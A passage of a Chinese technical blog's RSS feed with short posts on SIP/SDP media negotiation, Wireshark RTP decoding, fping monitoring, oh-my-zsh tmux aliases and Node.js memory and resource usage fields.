&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-rtp-path/2022-10-30-21-21-51.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是也有信令和媒体分开的网关。在和网关信令交互过程中，网关会将媒体地址放到sdp中。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/sip-rtp-path/2022-10-30-21-22-02.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;难点就来了，在nat存在的场景下，你并不知道sdp里的媒体地址是否是真实的地址。&lt;/p&gt;
&lt;p&gt;那么你就要选择，是相信sdp中的媒体地址，还是把sip信令的源ip作为媒体地址呢？&lt;/p&gt;</description>
    </item>
    <item>
      <title>媒体协商 offer/answer模型</title>
      <link>https://wdd.js.org/opensips/ch1/offer-answer/</link>
      <pubDate>Wed, 24 Jun 2020 08:51:48 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/offer-answer/</guid>
      <description>&lt;h1 id=&#34;1-简介&#34;&gt;1. 简介&lt;/h1&gt;
&lt;p&gt;媒体协商用来交换呼叫双方的媒体能力。如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持的编码类型有哪些&lt;/li&gt;
&lt;li&gt;采样频率是多少&lt;/li&gt;
&lt;li&gt;媒体端口，ip 信息&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;媒体协商使用的是请求和应答模型。即一方向另一方发送含有 sdp 信息的消息，然后另一方更具对方提供的编码以及自己支持的编码，如果协商成功，则将协商后的消息 sdp 再次发送给对方。&lt;/p&gt;
&lt;h1 id=&#34;2-常见的几个协商方式&#34;&gt;2. 常见的几个协商方式&lt;/h1&gt;
&lt;h2 id=&#34;21-在-invite-中-offer&#34;&gt;2.1 在 INVITE 中 offer&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/offer-answer/2022-10-30-21-19-52.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;22-在-200-ok-中-offer&#34;&gt;2.2 在 200 OK 中 offer&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/offer-answer/2022-10-30-21-20-04.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;23-在-update-中-offer&#34;&gt;2.3 在 UPDATE 中 offer&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/offer-answer/2022-10-30-21-20-14.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;24-在-prack-中-offer&#34;&gt;2.4 在 PRACK 中 offer&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch1/offer-answer/2022-10-30-21-20-43.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-常见的几个问题&#34;&gt;3. 常见的几个问题&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;一般呼叫到中继测时，中继回的 183 信令是会携带 sdp 信息的&lt;/li&gt;
&lt;li&gt;一般打到分机时，分机回的 180 信令是没有 sdp 信息的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不要先入为主的认为，某些请求一定带有 sdp，某些请求一定没有 sdp。而应当去测试请求或者响应消息上有没有携带 sdp 信息。&lt;/p&gt;
&lt;p&gt;携带 sdp 信息的 sip 消息会出现下面的头&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/sdp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>wireshark 播放抓包文件</title>
      <link>https://wdd.js.org/opensips/tools/wireshark-player-pcap/</link>
      <pubDate>Tue, 23 Jun 2020 18:00:05 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/wireshark-player-pcap/</guid>
      <description>&lt;h1 id=&#34;decode-as-udp&#34;&gt;Decode As Udp&lt;/h1&gt;
&lt;p&gt;wireshark 有时候并不能把udp包识别为rtp包，所以这边可能需要手动设置解码方式&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/wireshark-player-pcap/2022-12-02-17-04-30.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>fping 网络状态监控测试</title>
      <link>https://wdd.js.org/posts/2020/06/qtdzvr/</link>
      <pubDate>Sat, 20 Jun 2020 17:06:42 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/qtdzvr/</guid>
      <description>&lt;p&gt;新建一个文件 ip.list.cfg,  包含所有的带测试的ip地址。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.40.20
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;192.168.40.21
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行命令:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nohup fping -D -u -l -p &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt; -f ip.list.cfg &amp;amp;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;-D 显示时间戳&lt;/li&gt;
&lt;li&gt;-u 显示不可达的目标&lt;/li&gt;
&lt;li&gt;-l 持续的ping&lt;/li&gt;
&lt;li&gt;-p 每隔多少毫秒执行一次&lt;/li&gt;
&lt;li&gt;-f 指定ip列表文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在nohup.out中，回持续的显示到各个ip的网络状况。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643928.961414&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.20 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 3.22 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.22 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643928.969987&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.21 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 1.22 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.22 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643930.965753&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.20 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 5.25 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4.23 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643930.972833&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.21 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 1.14 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.18 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643932.965636&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.20 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 3.45 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3.97 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643932.978245&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.21 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 4.39 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2.25 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643934.991354&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.20 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 27.9 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;9.96 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643934.991621&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.21 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 14.9 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;5.42 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643936.978135&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.20 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 11.3 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.2 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1592643936.979620&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.40.21 : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; bytes, 1.37 ms &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4.61 avg, 0% loss&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>oh-my-zsh 安装 tmux插件</title>
      <link>https://wdd.js.org/posts/2020/06/rh9zsc/</link>
      <pubDate>Wed, 17 Jun 2020 13:20:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/rh9zsc/</guid>
      <description>&lt;h1 id=&#34;zshrc配置&#34;&gt;.zshrc配置&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim ~/.zshrc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plugins&lt;span style=&#34;color:#f92672&#34;&gt;=(&lt;/span&gt;git tmux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 加入tmux, 然后保存退出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;source ~/.zshrc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;tmux-快捷键&#34;&gt;tmux 快捷键&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Alias&lt;/th&gt;
          &lt;th&gt;Command&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ta&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux attach -t&lt;/td&gt;
          &lt;td&gt;Attach new tmux session to already running named session&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;tad&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux attach -d -t&lt;/td&gt;
          &lt;td&gt;Detach named tmux session&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ts&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux new-session -s&lt;/td&gt;
          &lt;td&gt;Create a new named tmux session&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;tl&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux list-sessions&lt;/td&gt;
          &lt;td&gt;Displays a list of running tmux sessions&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;tksv&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux kill-server&lt;/td&gt;
          &lt;td&gt;Terminate all running tmux sessions&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;tkss&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;tmux kill-session -t&lt;/td&gt;
          &lt;td&gt;Terminate named running tmux session&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;tmux&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;_zsh_tmux_plugin_run&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Start a new tmux session&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>Nodejs Gc Times</title>
      <link>https://wdd.js.org/fe/nodejs-gc-times/</link>
      <pubDate>Fri, 12 Jun 2020 11:14:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-gc-times/</guid>
      <description>&lt;h1 id=&#34;gc释放时机&#34;&gt;GC释放时机&lt;/h1&gt;
&lt;p&gt;当HeapUsed接近最大堆内存时，出发GC释放。 下图是深夜，压力比较小的时候。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/nodejs-gc-times/2022-10-29-10-56-20.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;下图是上午工作时间&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/nodejs-gc-times/2022-10-29-10-56-42.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;内存泄漏-oom&#34;&gt;内存泄漏 OOM&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/nodejs-gc-times/2022-10-29-10-56-53.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Nodejs诊断报告</title>
      <link>https://wdd.js.org/posts/2020/06/elg2v2/</link>
      <pubDate>Fri, 12 Jun 2020 09:07:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/elg2v2/</guid>
      <description></description>
    </item>
    <item>
      <title>Nodejs Mem Usage</title>
      <link>https://wdd.js.org/fe/nodejs-mem-usage/</link>
      <pubDate>Wed, 10 Jun 2020 14:24:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-mem-usage/</guid>
      <description>&lt;h1 id=&#34;processmemoryusage&#34;&gt;process.memoryUsage()&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  rss: 4935680,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  heapTotal: 1826816,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  heapUsed: 650472,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  external: 49879,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  arrayBuffers: &lt;span style=&#34;color:#ae81ff&#34;&gt;9386&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;heapTotal 和 heapUsed指向V8&amp;rsquo;s 内存使用&lt;/li&gt;
&lt;li&gt;external 指向 C++ 对象的内存使用， C++对象绑定js对象，并且由V8管理&lt;/li&gt;
&lt;li&gt;rss, 实际占用内存，包括C++, js对象和代码三块的总计。使用 ps aux命令输出时，rss的值对应了RSS列的数值&lt;/li&gt;
&lt;li&gt;node js 所有buffer占用的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;heapTotal&lt;/code&gt; and &lt;code&gt;heapUsed&lt;/code&gt; refer to V8&amp;rsquo;s memory usage.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;external&lt;/code&gt; refers to the memory usage of C++ objects bound to JavaScript objects managed by V8.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rss&lt;/code&gt;, Resident Set Size, is the amount of space occupied in the main memory device (that is a subset of the total allocated memory) for the process, including all C++ and JavaScript objects and code.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;arrayBuffers&lt;/code&gt; refers to memory allocated for &lt;code&gt;ArrayBuffer&lt;/code&gt;s and &lt;code&gt;SharedArrayBuffer&lt;/code&gt;s, including all Node.js &lt;a href=&#34;https://nodejs.org/dist/latest-v12.x/docs/api/buffer.html&#34;&gt;&lt;code&gt;Buffer&lt;/code&gt;&lt;/a&gt;s. This is also included in the &lt;code&gt;external&lt;/code&gt; value. When Node.js is used as an embedded library, this value may be &lt;code&gt;0&lt;/code&gt; because allocations for &lt;code&gt;ArrayBuffer&lt;/code&gt;s may not be tracked in that case.&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;processresourceusage&#34;&gt;process.resourceUsage()&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;userCPUTime&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_utime&lt;/code&gt; computed in microseconds. It is the same value as &lt;a href=&#34;https://nodejs.org/dist/latest-v12.x/docs/api/process.html#process_process_cpuusage_previousvalue&#34;&gt;&lt;code&gt;process.cpuUsage().user&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;systemCPUTime&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_stime&lt;/code&gt; computed in microseconds. It is the same value as &lt;a href=&#34;https://nodejs.org/dist/latest-v12.x/docs/api/process.html#process_process_cpuusage_previousvalue&#34;&gt;&lt;code&gt;process.cpuUsage().system&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;maxRSS&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_maxrss&lt;/code&gt; which is the maximum resident set size used in kilobytes.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sharedMemorySize&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_ixrss&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsharedDataSize&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_idrss&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsharedStackSize&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_isrss&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;minorPageFault&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_minflt&lt;/code&gt; which is the number of minor page faults for the process, see &lt;a href=&#34;https://en.wikipedia.org/wiki/Page_fault#Minor&#34;&gt;this article for more details&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;majorPageFault&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_majflt&lt;/code&gt; which is the number of major page faults for the process, see &lt;a href=&#34;https://en.wikipedia.org/wiki/Page_fault#Major&#34;&gt;this article for more details&lt;/a&gt;. This field is not supported on Windows.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;swappedOut&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_nswap&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fsRead&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_inblock&lt;/code&gt; which is the number of times the file system had to perform input.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fsWrite&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_oublock&lt;/code&gt; which is the number of times the file system had to perform output.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ipcSent&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_msgsnd&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ipcReceived&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_msgrcv&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;signalsCount&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_nsignals&lt;/code&gt; but is not supported by any platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;voluntaryContextSwitches&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_nvcsw&lt;/code&gt; which is the number of times a CPU context switch resulted due to a process voluntarily giving up the processor before its time slice was completed (usually to await availability of a resource). This field is not supported on Windows.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;involuntaryContextSwitches&lt;/code&gt; &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures#Number_type&#34;&gt;&lt;!-- raw HTML omitted --&gt;&lt;/a&gt; maps to &lt;code&gt;ru_nivcsw&lt;/code&gt; which is the number of times a CPU context switch resulted due to a higher priority process becoming runnable or because the current process exceeded its time slice. This field is not supported on Windows.&lt;/li&gt;
&lt;/ul&gt;
